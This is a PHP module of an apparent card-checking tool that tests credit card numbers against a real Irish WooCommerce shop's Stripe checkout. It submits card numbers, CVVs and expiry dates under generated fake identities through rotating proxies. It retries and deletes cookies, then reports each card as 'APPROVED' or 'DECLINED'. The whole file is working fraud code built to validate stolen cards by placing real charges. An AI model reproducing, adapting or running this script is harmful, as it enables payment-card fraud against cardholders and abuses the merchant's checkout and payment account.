<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$cookie = uniqid();

$fake = $this->tools->GetUser();

$data = 'type=card&owner[name]='.$fake->first.'+'.$fake->last.'&owner[address][line1]=3845+ormond+quay&owner[address][state]=LH&owner[address][city]=Loughrea&owner[address][country]=IE&owner[email]='.urlencode($fake->email).'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F80b922db8%3B+stripe-js-v3%2F80b922db8&time_on_page='.rand(50000, 100000).'&key=pk_live_sUOQOMUEWnOOCMoPmDsjCTep';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/sources', $data, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$src = $json_r1->id;

$data = 'quantity=1&add-to-cart=6233';

$r2 = $this->curlx->Post('https://stillorgandecor.ie/product/jv47bpc/', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$r3 = $this->curlx->Get('https://stillorgandecor.ie/checkout/', null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$nonce_v1 = trim(strip_tags($this->getstr($r3->body, 'woocommerce-process-checkout-nonce" value="', '"')));

if (empty($nonce_v1)) {
	$empty = 'Third Request Tokens is Empty';

	goto start;
}

$data = 'billing_first_name='.$fake->first.'&billing_last_name='.$fake->last.'&billing_company=&billing_country=IE&billing_address_1=3845+ormond+quay&billing_address_2=&billing_city=Loughrea&billing_state=LH&billing_postcode=&billing_phone=2564567654&billing_email='.urlencode($fake->email).'&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=IE&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=D&shipping_postcode=&order_comments=&shipping_method%5B0%5D=local_pickup%3A6&wc-points-rewards-max-points=0&payment_method=stripe&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce_v1.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$src;

$r4 = $this->curlx->Post('https://stillorgandecor.ie/?wc-ajax=checkout', $data, null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$json_r4 = json_decode($r4->body);

if (isset($json_r4->result) && $json_r4->result == 'success') {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CHARGED - Result -> Success!"];

	goto end;
}

$err = trim(strip_tags($this->getstr($r4->body, '<li>\n\t\t\t', '\t')));

$msg = empty($err) ? trim(strip_tags($json_r4->messages ?? '')) : $err;

$status = $this->response->Stripe($r4->body, $err);

end: